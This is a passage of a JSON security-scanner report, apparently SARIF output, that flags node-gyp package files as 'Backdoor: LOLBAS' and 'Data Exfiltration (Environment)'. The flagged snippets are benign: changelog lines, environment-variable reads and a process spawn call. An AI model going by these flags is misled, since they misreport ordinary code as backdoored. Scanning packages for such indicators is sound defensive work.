                  "endLine": 222,
                  "endColumn": 21,
                  "snippet": {
                    "text": "p/compare/v9.0.0...v9.1.0) (2022-07-13)\n\n\n### Features\n\n* Update function getSDK() to support Windows 11 SDK ([#2565](https://www.github.com/nodejs/node-gyp/issues/2565)) ([ea8520e](https://www.github.com/nodejs/node-gyp/commit/ea8520e3855374bd15b6d001fe112d58a8d7d737))\n\n\n### Bug Fixes\n\n* extend tap timeout length to allow for slow CI ([6f74c76](https://www.github.com/nodejs/node-gyp/commit/6f74c762fe3c19bdd20245cb5c02e2dfa65d9451))\n* new ca & server certs, bundle in .js file and unpack for testing ([147e3d3](https://www.github.com/nodejs/node-gyp/commit/147e3d34f44a97deb7aa507207680cf0f4e662a2))\n* re-",
                    "rendered": {
                      "text": "p/compare/v9.0.0...v9.1.0) (2022-07-13)\n\n\n### Features\n\n* Update function getSDK() to support Windows 11 SDK ([#2565](https://www.github.com/nodejs/node-gyp/issues/2565)) ([ea8520e](https://www.github.com/nodejs/node-gyp/commit/ea8520e3855374bd15b6d001fe112d58a8d7d737))\n\n\n### Bug Fixes\n\n* extend tap timeout length to allow for slow CI ([6f74c76](https://www.github.com/nodejs/node-gyp/commit/6f74c762fe3c19bdd20245cb5c02e2dfa65d9451))\n* new ca & server certs, bundle in .js file and unpack for testing ([147e3d3](https://www.github.com/nodejs/node-gyp/commit/147e3d34f44a97deb7aa507207680cf0f4e662a2))\n* re-",
                      "markdown": "`p/compare/v9.0.0...v9.1.0) (2022-07-13)\n\n\n### Features\n\n* Update function getSDK() to support Windows 11 SDK ([#2565](https://www.github.com/nodejs/node-gyp/issues/2565)) ([ea8520e](https://www.github.com/nodejs/node-gyp/commit/ea8520e3855374bd15b6d001fe112d58a8d7d737))\n\n\n### Bug Fixes\n\n* extend tap timeout length to allow for slow CI ([6f74c76](https://www.github.com/nodejs/node-gyp/commit/6f74c762fe3c19bdd20245cb5c02e2dfa65d9451))\n* new ca & server certs, bundle in .js file and unpack for testing ([147e3d3](https://www.github.com/nodejs/node-gyp/commit/147e3d34f44a97deb7aa507207680cf0f4e662a2))\n* re-`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 173,
                  "startColumn": 10,
                  "endLine": 173,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n### Bug Fixes\n\n* increase node 12 support to ^12.13 ([#2771](https://www.github.com/nodejs/node-gyp/issues/2771)) ([888efb9](https://www.github.com/nodejs/node-gyp/commit/888efb9055857afee6a6b54550722cf9ae3ee323))\n\n\n### Miscellaneous\n",
                    "rendered": {
                      "text": "\n### Bug Fixes\n\n* increase node 12 support to ^12.13 ([#2771](https://www.github.com/nodejs/node-gyp/issues/2771)) ([888efb9](https://www.github.com/nodejs/node-gyp/commit/888efb9055857afee6a6b54550722cf9ae3ee323))\n\n\n### Miscellaneous\n",
                      "markdown": "`\n### Bug Fixes\n\n* increase node 12 support to ^12.13 ([#2771](https://www.github.com/nodejs/node-gyp/issues/2771)) ([888efb9](https://www.github.com/nodejs/node-gyp/commit/888efb9055857afee6a6b54550722cf9ae3ee323))\n\n\n### Miscellaneous\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 132,
                  "startColumn": 19,
                  "endLine": 132,
                  "endColumn": 27,
                  "snippet": {
                    "text": "://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* which@4.0.0 ([#2928](https://www.github.com/nodejs/node-gyp/issues/2928)) ([e388255](https://www.github.com/nodejs/node-gyp/commit/e38825531403aabeae7abe58e76867f31b832f36))\n\n\n### Miscellaneous\n\n* add check engines script to CI ([#2922](https://www.github.com/nodejs/node-gyp/issues/2922)) ([21a7249](https://www.github.com/nodejs/node-gyp/commit/21a7249b40d8f95e7721e450fd18764adb1648a7))\n* empty commit to add changelog entries from [#2770](https://www.github.com/nodejs/node-gyp/issues/2770) ([4a50fe3](https://www.gith",
                    "rendered": {
                      "text": "://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* which@4.0.0 ([#2928](https://www.github.com/nodejs/node-gyp/issues/2928)) ([e388255](https://www.github.com/nodejs/node-gyp/commit/e38825531403aabeae7abe58e76867f31b832f36))\n\n\n### Miscellaneous\n\n* add check engines script to CI ([#2922](https://www.github.com/nodejs/node-gyp/issues/2922)) ([21a7249](https://www.github.com/nodejs/node-gyp/commit/21a7249b40d8f95e7721e450fd18764adb1648a7))\n* empty commit to add changelog entries from [#2770](https://www.github.com/nodejs/node-gyp/issues/2770) ([4a50fe3](https://www.gith",
                      "markdown": "`://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* which@4.0.0 ([#2928](https://www.github.com/nodejs/node-gyp/issues/2928)) ([e388255](https://www.github.com/nodejs/node-gyp/commit/e38825531403aabeae7abe58e76867f31b832f36))\n\n\n### Miscellaneous\n\n* add check engines script to CI ([#2922](https://www.github.com/nodejs/node-gyp/issues/2922)) ([21a7249](https://www.github.com/nodejs/node-gyp/commit/21a7249b40d8f95e7721e450fd18764adb1648a7))\n* empty commit to add changelog entries from [#2770](https://www.github.com/nodejs/node-gyp/issues/2770) ([4a50fe3](https://www.gith`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 120,
                  "startColumn": 1,
                  "endLine": 120,
                  "endColumn": 7,
                  "snippet": {
                    "text": "om/nodejs/node-gyp/commit/d644ce48311edf090d0e920ad449e5766c757933))\n* Update windows installation instructions in README.md ([#2882](https://www.github.com/nodejs/node-gyp/issues/2882)) ([c9caa2e](https://www.github.com/nodejs/node-gyp/commit/c9caa2ecf3c7deae68444ce8fabb32d2dca651cd))\n\n\n### Core\n\n* find python checks order changed on windows ([#2872](https://www.github.com/nodejs/node-gyp/issues/2872)) ([b030555](https://www.github.com/nodejs/node-gyp/commit/b030555cdb754d9c23906e7e707115cd077bbf76))\n* glob@10.3.10 ([#2926](https://www.github.com/nodejs/node-gyp/issues/2926)) ([4bef1ec](https://www",
                    "rendered": {
                      "text": "om/nodejs/node-gyp/commit/d644ce48311edf090d0e920ad449e5766c757933))\n* Update windows installation instructions in README.md ([#2882](https://www.github.com/nodejs/node-gyp/issues/2882)) ([c9caa2e](https://www.github.com/nodejs/node-gyp/commit/c9caa2ecf3c7deae68444ce8fabb32d2dca651cd))\n\n\n### Core\n\n* find python checks order changed on windows ([#2872](https://www.github.com/nodejs/node-gyp/issues/2872)) ([b030555](https://www.github.com/nodejs/node-gyp/commit/b030555cdb754d9c23906e7e707115cd077bbf76))\n* glob@10.3.10 ([#2926](https://www.github.com/nodejs/node-gyp/issues/2926)) ([4bef1ec](https://www",
                      "markdown": "`om/nodejs/node-gyp/commit/d644ce48311edf090d0e920ad449e5766c757933))\n* Update windows installation instructions in README.md ([#2882](https://www.github.com/nodejs/node-gyp/issues/2882)) ([c9caa2e](https://www.github.com/nodejs/node-gyp/commit/c9caa2ecf3c7deae68444ce8fabb32d2dca651cd))\n\n\n### Core\n\n* find python checks order changed on windows ([#2872](https://www.github.com/nodejs/node-gyp/issues/2872)) ([b030555](https://www.github.com/nodejs/node-gyp/commit/b030555cdb754d9c23906e7e707115cd077bbf76))\n* glob@10.3.10 ([#2926](https://www.github.com/nodejs/node-gyp/issues/2926)) ([4bef1ec](https://www`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 106,
                  "startColumn": 16,
                  "endLine": 106,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n### Tests\n\n* increase mocha timeout ([#2887](https://www.github.com/nodejs/node-gyp/issues/2887)) ([445c28f](https://www.github.com/nodejs/node-gyp/commit/445c28fabc5fbdf9c3bb3341fb70660a3530f6ad))\n* update expired certs ([#2908](https://www.github.com/nodejs/node-gyp/issues/2908)) ([5746691](https://www.github.com/nodejs/node-gyp/commit/5746691a36f7b37019d4b8d4e9616aec43d20410))\n\n\n",
                    "rendered": {
                      "text": "\n### Tests\n\n* increase mocha timeout ([#2887](https://www.github.com/nodejs/node-gyp/issues/2887)) ([445c28f](https://www.github.com/nodejs/node-gyp/commit/445c28fabc5fbdf9c3bb3341fb70660a3530f6ad))\n* update expired certs ([#2908](https://www.github.com/nodejs/node-gyp/issues/2908)) ([5746691](https://www.github.com/nodejs/node-gyp/commit/5746691a36f7b37019d4b8d4e9616aec43d20410))\n\n\n",
                      "markdown": "`\n### Tests\n\n* increase mocha timeout ([#2887](https://www.github.com/nodejs/node-gyp/issues/2887)) ([445c28f](https://www.github.com/nodejs/node-gyp/commit/445c28fabc5fbdf9c3bb3341fb70660a3530f6ad))\n* update expired certs ([#2908](https://www.github.com/nodejs/node-gyp/issues/2908)) ([5746691](https://www.github.com/nodejs/node-gyp/commit/5746691a36f7b37019d4b8d4e9616aec43d20410))\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 6,
                  "endLine": 89,
                  "endColumn": 12,
                  "snippet": {
                    "text": "ll internal functions to async/await ([355622f](https://www.github.com/nodejs/node-gyp/commit/355622f4aac3bd3056b9e03aac5fa2f42a4b3576))\n* convert internal classes from util.inherits to classes ([d52997e](https://www.github.com/nodejs/node-gyp/commit/d52997e975b9da6e0cea3d9b99873e9ddc768679))\n* drop node 14 support ([#2929](https://www.github.com/nodejs/node-gyp/issues/2929)) ([1b3bd34](https://www.github.com/nodejs/node-gyp/commit/1b3bd341b40f384988d03207ce8187e93ba609bc))\n* drop rimraf dependency ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* ",
                    "rendered": {
                      "text": "ll internal functions to async/await ([355622f](https://www.github.com/nodejs/node-gyp/commit/355622f4aac3bd3056b9e03aac5fa2f42a4b3576))\n* convert internal classes from util.inherits to classes ([d52997e](https://www.github.com/nodejs/node-gyp/commit/d52997e975b9da6e0cea3d9b99873e9ddc768679))\n* drop node 14 support ([#2929](https://www.github.com/nodejs/node-gyp/issues/2929)) ([1b3bd34](https://www.github.com/nodejs/node-gyp/commit/1b3bd341b40f384988d03207ce8187e93ba609bc))\n* drop rimraf dependency ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* ",
                      "markdown": "`ll internal functions to async/await ([355622f](https://www.github.com/nodejs/node-gyp/commit/355622f4aac3bd3056b9e03aac5fa2f42a4b3576))\n* convert internal classes from util.inherits to classes ([d52997e](https://www.github.com/nodejs/node-gyp/commit/d52997e975b9da6e0cea3d9b99873e9ddc768679))\n* drop node 14 support ([#2929](https://www.github.com/nodejs/node-gyp/issues/2929)) ([1b3bd34](https://www.github.com/nodejs/node-gyp/commit/1b3bd341b40f384988d03207ce8187e93ba609bc))\n* drop rimraf dependency ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 25,
                  "endLine": 83,
                  "endColumn": 31,
                  "snippet": {
                    "text": "* use .npmignore file to limit which files are published (#2921)\n* the `Gyp` class exported is now created using ECMAScript classes and therefore might have small differences to classes that were previously created with `util.inherits`.\n* All internal functions have been coverted to return promises and no longer accept callbacks. This is not a breaking change for users but may be breaking to consumers of `node-gyp` if you are requiring internal functions directly.\n* `node-gyp` now supports node `^16.14.0 || >=18.0.0`\n\n### Features\n\n",
                    "rendered": {
                      "text": "* use .npmignore file to limit which files are published (#2921)\n* the `Gyp` class exported is now created using ECMAScript classes and therefore might have small differences to classes that were previously created with `util.inherits`.\n* All internal functions have been coverted to return promises and no longer accept callbacks. This is not a breaking change for users but may be breaking to consumers of `node-gyp` if you are requiring internal functions directly.\n* `node-gyp` now supports node `^16.14.0 || >=18.0.0`\n\n### Features\n\n",
                      "markdown": "`* use .npmignore file to limit which files are published (#2921)\n* the `Gyp` class exported is now created using ECMAScript classes and therefore might have small differences to classes that were previously created with `util.inherits`.\n* All internal functions have been coverted to return promises and no longer accept callbacks. This is not a breaking change for users but may be breaking to consumers of `node-gyp` if you are requiring internal functions directly.\n* `node-gyp` now supports node `^16.14.0 || >=18.0.0`\n\n### Features\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 17,
                  "endLine": 52,
                  "endColumn": 23,
                  "snippet": {
                    "text": "### Doc\n\n* npm is currently v10 ([#2970](https://github.com/nodejs/node-gyp/issues/2970)) ([7705a22](https://github.com/nodejs/node-gyp/commit/7705a22f31a62076e9f8429780a459f4ad71ea4c))\n* remove outdated Node versions from readme ([#2955](https://github.com/nodejs/node-gyp/issues/2955)) ([ae8478e](https://github.com/nodejs/node-gyp/commit/ae8478ec32d9b2fa71b591ac22cdf867ef2e9a7d))\n* remove outdated update engines.node reference in 10.0.0 changelog ([b42e796](https://github.com/nodejs/node-gyp/commit/b42e7966177f006f3d1aab1d27885d8372c8ed01))\n\n\n",
                    "rendered": {
                      "text": "### Doc\n\n* npm is currently v10 ([#2970](https://github.com/nodejs/node-gyp/issues/2970)) ([7705a22](https://github.com/nodejs/node-gyp/commit/7705a22f31a62076e9f8429780a459f4ad71ea4c))\n* remove outdated Node versions from readme ([#2955](https://github.com/nodejs/node-gyp/issues/2955)) ([ae8478e](https://github.com/nodejs/node-gyp/commit/ae8478ec32d9b2fa71b591ac22cdf867ef2e9a7d))\n* remove outdated update engines.node reference in 10.0.0 changelog ([b42e796](https://github.com/nodejs/node-gyp/commit/b42e7966177f006f3d1aab1d27885d8372c8ed01))\n\n\n",
                      "markdown": "`### Doc\n\n* npm is currently v10 ([#2970](https://github.com/nodejs/node-gyp/issues/2970)) ([7705a22](https://github.com/nodejs/node-gyp/commit/7705a22f31a62076e9f8429780a459f4ad71ea4c))\n* remove outdated Node versions from readme ([#2955](https://github.com/nodejs/node-gyp/issues/2955)) ([ae8478e](https://github.com/nodejs/node-gyp/commit/ae8478ec32d9b2fa71b591ac22cdf867ef2e9a7d))\n* remove outdated update engines.node reference in 10.0.0 changelog ([b42e796](https://github.com/nodejs/node-gyp/commit/b42e7966177f006f3d1aab1d27885d8372c8ed01))\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 918,
                  "startColumn": 115,
                  "endLine": 918,
                  "endColumn": 136,
                  "snippet": {
                    "text": "0db7`](https://github.com/nodejs/node-gyp/commit/6dcf220db7)] - test version major directly, don't use semver.satisfies() (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`938dd18d1c`](https://github.com/nodejs/node-gyp/commit/938dd18d1c)] - refactor for clarity, fix dist-url, add env var dist-url functionality (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://",
                    "rendered": {
                      "text": "0db7`](https://github.com/nodejs/node-gyp/commit/6dcf220db7)] - test version major directly, don't use semver.satisfies() (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`938dd18d1c`](https://github.com/nodejs/node-gyp/commit/938dd18d1c)] - refactor for clarity, fix dist-url, add env var dist-url functionality (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://",
                      "markdown": "`0db7`](https://github.com/nodejs/node-gyp/commit/6dcf220db7)] - test version major directly, don't use semver.satisfies() (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`938dd18d1c`](https://github.com/nodejs/node-gyp/commit/938dd18d1c)] - refactor for clarity, fix dist-url, add env var dist-url functionality (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 716,
                  "startColumn": 96,
                  "endLine": 716,
                  "endColumn": 110,
                  "snippet": {
                    "text": "-gyp/pull/1570)\n* [[`9e46872ea3`](https://github.com/nodejs/node-gyp/commit/9e46872ea3)] - **bin,lib**: remove extra comments/lines/spaces (Jon Moss) [#1508](https://github.com/nodejs/node-gyp/pull/1508)\n* [[`8098ebdeb4`](https://github.com/nodejs/node-gyp/commit/8098ebdeb4)] - **deps**: replace `osenv` dependency with native `os` (Selwyn)\n* [[`f83b457e03`](https://github.com/nodejs/node-gyp/commit/f83b457e03)] - **deps**: bump request to 2.8.7, fixes heok/hawk issues (Rohit Hazra) [#1492](https://github.com/nodejs/node-gyp/pull/1492)\n* [[`323cee7323`](https://github.com/nodejs/node-gyp/commit/323cee7323)] ",
                    "rendered": {
                      "text": "-gyp/pull/1570)\n* [[`9e46872ea3`](https://github.com/nodejs/node-gyp/commit/9e46872ea3)] - **bin,lib**: remove extra comments/lines/spaces (Jon Moss) [#1508](https://github.com/nodejs/node-gyp/pull/1508)\n* [[`8098ebdeb4`](https://github.com/nodejs/node-gyp/commit/8098ebdeb4)] - **deps**: replace `osenv` dependency with native `os` (Selwyn)\n* [[`f83b457e03`](https://github.com/nodejs/node-gyp/commit/f83b457e03)] - **deps**: bump request to 2.8.7, fixes heok/hawk issues (Rohit Hazra) [#1492](https://github.com/nodejs/node-gyp/pull/1492)\n* [[`323cee7323`](https://github.com/nodejs/node-gyp/commit/323cee7323)] ",
                      "markdown": "`-gyp/pull/1570)\n* [[`9e46872ea3`](https://github.com/nodejs/node-gyp/commit/9e46872ea3)] - **bin,lib**: remove extra comments/lines/spaces (Jon Moss) [#1508](https://github.com/nodejs/node-gyp/pull/1508)\n* [[`8098ebdeb4`](https://github.com/nodejs/node-gyp/commit/8098ebdeb4)] - **deps**: replace `osenv` dependency with native `os` (Selwyn)\n* [[`f83b457e03`](https://github.com/nodejs/node-gyp/commit/f83b457e03)] - **deps**: bump request to 2.8.7, fixes heok/hawk issues (Rohit Hazra) [#1492](https://github.com/nodejs/node-gyp/pull/1492)\n* [[`323cee7323`](https://github.com/nodejs/node-gyp/commit/323cee7323)] `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/build.js"
                },
                "region": {
                  "startLine": 196,
                  "startColumn": 44,
                  "endLine": 196,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    if (!win) {\n      // Add build-time dependency symlinks (such as Python) to PATH\n      buildBinsDir = path.resolve('build', 'node_gyp_bins')\n      process.env.PATH = `${buildBinsDir}:${process.env.PATH}`\n      await fs.mkdir(buildBinsDir, { recursive: true })\n      const symlinkDestination = path.join(buildBinsDir, 'python3')\n      try {\n",
                    "rendered": {
                      "text": "    if (!win) {\n      // Add build-time dependency symlinks (such as Python) to PATH\n      buildBinsDir = path.resolve('build', 'node_gyp_bins')\n      process.env.PATH = `${buildBinsDir}:${process.env.PATH}`\n      await fs.mkdir(buildBinsDir, { recursive: true })\n      const symlinkDestination = path.join(buildBinsDir, 'python3')\n      try {\n",
                      "markdown": "`    if (!win) {\n      // Add build-time dependency symlinks (such as Python) to PATH\n      buildBinsDir = path.resolve('build', 'node_gyp_bins')\n      process.env.PATH = `${buildBinsDir}:${process.env.PATH}`\n      await fs.mkdir(buildBinsDir, { recursive: true })\n      const symlinkDestination = path.join(buildBinsDir, 'python3')\n      try {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/build.js"
                },
                "region": {
                  "startLine": 196,
                  "startColumn": 6,
                  "endLine": 196,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    if (!win) {\n      // Add build-time dependency symlinks (such as Python) to PATH\n      buildBinsDir = path.resolve('build', 'node_gyp_bins')\n      process.env.PATH = `${buildBinsDir}:${process.env.PATH}`\n      await fs.mkdir(buildBinsDir, { recursive: true })\n      const symlinkDestination = path.join(buildBinsDir, 'python3')\n      try {\n",
                    "rendered": {
                      "text": "    if (!win) {\n      // Add build-time dependency symlinks (such as Python) to PATH\n      buildBinsDir = path.resolve('build', 'node_gyp_bins')\n      process.env.PATH = `${buildBinsDir}:${process.env.PATH}`\n      await fs.mkdir(buildBinsDir, { recursive: true })\n      const symlinkDestination = path.join(buildBinsDir, 'python3')\n      try {\n",
                      "markdown": "`    if (!win) {\n      // Add build-time dependency symlinks (such as Python) to PATH\n      buildBinsDir = path.resolve('build', 'node_gyp_bins')\n      process.env.PATH = `${buildBinsDir}:${process.env.PATH}`\n      await fs.mkdir(buildBinsDir, { recursive: true })\n      const symlinkDestination = path.join(buildBinsDir, 'python3')\n      try {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/build.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 32,
                  "endLine": 27,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\n  const makeCommand = gyp.opts.make || process.env.MAKE || platformMake\n  let command = win ? 'msbuild' : makeCommand\n  const jobs = gyp.opts.jobs || process.env.JOBS\n  let buildType\n  let config\n  let arch\n",
                    "rendered": {
                      "text": "\n  const makeCommand = gyp.opts.make || process.env.MAKE || platformMake\n  let command = win ? 'msbuild' : makeCommand\n  const jobs = gyp.opts.jobs || process.env.JOBS\n  let buildType\n  let config\n  let arch\n",
                      "markdown": "`\n  const makeCommand = gyp.opts.make || process.env.MAKE || platformMake\n  let command = win ? 'msbuild' : makeCommand\n  const jobs = gyp.opts.jobs || process.env.JOBS\n  let buildType\n  let config\n  let arch\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/build.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 39,
                  "endLine": 25,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    })\n  }\n\n  const makeCommand = gyp.opts.make || process.env.MAKE || platformMake\n  let command = win ? 'msbuild' : makeCommand\n  const jobs = gyp.opts.jobs || process.env.JOBS\n  let buildType\n",
                    "rendered": {
                      "text": "    })\n  }\n\n  const makeCommand = gyp.opts.make || process.env.MAKE || platformMake\n  let command = win ? 'msbuild' : makeCommand\n  const jobs = gyp.opts.jobs || process.env.JOBS\n  let buildType\n",
                      "markdown": "`    })\n  }\n\n  const makeCommand = gyp.opts.make || process.env.MAKE || platformMake\n  let command = win ? 'msbuild' : makeCommand\n  const jobs = gyp.opts.jobs || process.env.JOBS\n  let buildType\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/node-gyp.js"
                },
                "region": {
                  "startLine": 181,
                  "startColumn": 10,
                  "endLine": 182,
                  "snippet": {
                    "text": "    const cp = childProcess.spawn(command, args, opts)\n    log.info('spawn', command)\n    log.info('spawn args', args)\n    return cp\n  }\n\n  /**\n   * Returns the usage instructions for node-gyp.\n",
                    "rendered": {
                      "text": "    const cp = childProcess.spawn(command, args, opts)\n    log.info('spawn', command)\n    log.info('spawn args', args)\n    return cp\n  }\n\n  /**\n   * Returns the usage instructions for node-gyp.\n",
                      "markdown": "`    const cp = childProcess.spawn(command, args, opts)\n    log.info('spawn', command)\n    log.info('spawn args', args)\n    return cp\n  }\n\n  /**\n   * Returns the usage instructions for node-gyp.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/node-gyp.js"
                },
                "region": {
                  "startLine": 178,
                  "startColumn": 9,
                  "endLine": 178,
                  "endColumn": 13,
